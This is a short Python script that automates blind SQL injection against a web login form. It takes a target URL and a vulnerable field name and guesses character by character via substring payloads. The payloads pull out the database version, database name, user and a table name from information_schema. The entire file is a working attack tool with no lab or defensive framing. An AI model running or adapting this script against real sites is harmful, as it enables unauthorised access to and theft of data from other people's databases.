#! /usr/bin/env python
"""
This program uses recursion to find useful information from the backend database
"""

__author__="Aaron Castro"
__author_email__="aaron.castro.sanchez@outlook.com"
__copyright__="Aaron Castro"
__license__="MIT"

import requests, re, string, argparse, datetime

req=requests.session()

def remove_html(html):
    clean=re.compile('<.*?>')
    return re.sub(clean, '', html)

def look_for_exitcode(html):
    if re.search('si tiene acceso', html):
        return(True)
    else:
        return(False)
        
def extract(key, query, init=''):
    for letter in string.ascii_lowercase + string.digits + string.punctuation:
        init=init[:-1] + letter
        init=init.strip()
        payload = {key: 'admin\' and substring(' + query + ',1,' + str(len(init)) + ')=\'' + init + '\'-- -'}
        print('Working... ' + datetime.datetime.now().time().strftime('%H:%M:%S'), end='\r')
        r = requests.post(url, data=payload)
        if look_for_exitcode(remove_html(r.text))==True:
            if init not in match:
                match.append(init)
            init= init + letter
            extract(key, query, init)
            break

parser=argparse.ArgumentParser()
parser.add_argument('-u', '--url', help='Base URL', type=str, required=True)
parser.add_argument('-k', '--key', help='Vulnerable input', type=str, required=True)
args=parser.parse_args()

if args.url:
    url=args.url.strip("\"")
if args.key:
    key=args.key

query='version()'
match=[]
extract(key, query)
if match:
    print('Database version ' + max(match, key=len))
else:
    print("Database version not found!")

query='database()'
match=[]
extract(key, query)
if match:
    print('Database name ' + max(match, key=len))
    dbname=max(match, key=len)
else:
    print("Database name not found!")

query='user()'
match=[]
extract(key, query)
if match:
    print('Database username ' + max(match, key=len))
else:
    print("Database username not found!")
    
query='(select table_name from information_schema.tables where table_schema="' + dbname + '" limit 1)'
match=[]
extract(key, query)
if match:
    print('Table name ' + max(match, key=len))
else:
    print("Table name not found!")

if __name__=="__main__":
	args=parser.parse_args()